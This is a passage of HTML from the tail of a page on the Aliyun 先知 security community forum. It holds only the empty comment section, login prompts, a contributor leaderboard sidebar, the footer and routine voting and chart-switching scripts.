            
        </div>
    </div>
</div>

    <!-- topic & appendix -->
    



<div class="row box">
    <ol class="breadcrumb">
        <li class="active">0 条回复</li>
    </ol>
    <div class="box-container post-container">
        
            <ul>
                <li style="min-height: 50px;line-height: 60px;margin-left: 15px"><strong>动动手指，沙发就是你的了！</strong></li>
            </ul>
        
    </div>
</div>


    <!-- posts of topic -->
    
        <div class="row box" id="reply-box">
            
            <div class="box-container clearfix">
                
                    <div class="reminder">
                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9488&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
                    </div>
                
            </div>
        </div>
    
    <!-- editor for post -->
    

        </div>
        <div class="span3 pull-right offset sidebar">
            


    <div class="box">
        <div class="info-panel">
            <p><strong>先知社区</strong></p>
            <hr>
            <p class="text-center login-btn">
                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9488&amp;from_type=xianzhi" class="btn">现在登录</a>
            </p>
        </div>
    </div>


<div class="box">
    <div class="hot-node notice">
        <div class="info-body" style="padding: 15px;">
            <a href="/t/7739" target="_blank">
            <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200508094357-62057bf0-90cd-1.jpg"
                 style="border-radius: 2px;" alt="阿里云情报奖励X计划">
            </a>
        </div>
    </div>
</div>


    <div class="box">
        <div class="hot-node notice">
            <div class="info-body">
                <a href="/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
            </div>
        </div>
    </div>


<div class="box">
    <div class="global-charts">
        <div id="chart-header">
            <div class="col-sm-4 text-center charts" data-type="year"
            >
                年度贡献榜
            </div>
            <div class="text-center charts active" data-type="month"
            >
                月度贡献榜
            </div>
            <div class="clearfix"></div>
        </div>
        <div id="chart_body">
            <div class="info-body" data-type="year">

                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/5791_412c2e534e4220d76c.png"/>
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="/u/5791" title="深信服千里目安全实验室"
                               >深信服千里目安全实验室</a>
                            <span class="num-box">
                                <span class="badge badge-important">9</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="https://xzfile.aliyuncs.com//media/upload/avatars/default_avatar.png"/>
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="/u/5274" title="hackedbylh"
                               >hackedbylh</a>
                            <span class="num-box">
                                <span class="badge badge-important">8</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/21852_2f8cc9ba40dd9f669b.png"/>
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="/u/21852" title="ERFZE"
                               >ERFZE</a>
                            <span class="num-box">
                                <span class="badge badge-important">6</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/34476_643d12b9db85fb31b9.png"/>
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="/u/34476" title="Firebasky"
                               >Firebasky</a>
                            <span class="num-box">
                                <span class="badge badge-important">5</span>
                            </span>
                        </div>

                    </div>
                
                    <div class="member">
                        <div class="pull-left chart-avatar">
                            
                                <img src="https://xzfile.aliyuncs.com/media/upload/avatars/20638_597171fb71fe3d80b8.png"/>
                            
                        </div>
                        <div class="chart-name">
                            <a class="nickname" href="/u/20638" title="ghtwf01"
                               >ghtwf01</a>
                            <span class="num-box">
                                <span class="badge badge-important">5</span>
                            </span>
                        </div>

                    </div>
                
            </div>
            <div class="info-body" data-type="month">
                
                    <div class="member">
                        <p class="text-center">暂无排行</p>
                    </div>
                
            </div>
        </div>

    </div>
</div>

    <div class="box" id="toc-container">
        <div class="panel-info">
            <div class="panel-heading">
                <h4>目录</h4>
            </div>
            <div id="toc">
                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
            </div>
        </div>
    </div>
    <div style="clear: both;"></div>


    <script type="text/javascript">
        $(function () {
            $(".charts").click(switchChart)

            function switchChart() {
                let _this = $(this);
                let idx = _this.attr("data-type")
                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
                if (!_this.hasClass("active")) {
                    _this.addClass("active").siblings().removeClass("active")
                    content.show().siblings().hide()
                }
            }
        })
    </script>


    <style>

    </style>

        </div>
    </div>


</div>
<footer class="bs-docs-footer">
    <div class="container text-center">
        <div class="links">
            <a href="/feed" target="_blank">RSS</a>
            <a href="/about" target="_blank"><span>关于社区</span></a>
            <a href="/partner" target="_blank"><span>友情链接</span></a>
            <a href="/notice">社区小黑板</a>
        </div>
    </div>
</footer>
</body>
<script src="/static/js/bootstrap.min.js"></script>
<script src="/static/js/xz.js"></script>


    
    <script type="text/javascript">
        $(document).ready(function () {
            voteUp = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/up/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9488&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-up').html(data.html);
                                }
                            }
                        }
                    });
                }
            };
            voteDown = function (topicPk) {
                if (topicPk) {
                    $.ajax({
                        url: '/forum/topic/down/',
                        data: {'pk': topicPk},
                        type: 'post',
                        dataType: 'json',
                        success: function (data) {
                            if (data.not_authenticated) {
                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9488&amp;from_type=xianzhi'
                            } else {
                                if (data.success) {
                                    $('.t-vote > .vote-down').html(data.html);
                                }
                            }

                        }
                    });
                }
            };
            
        });
    </script>


    <script src="https://s11.cnzz.com/z_stat.php?id=1260716569&web_id=1260716569"></script>

</html>
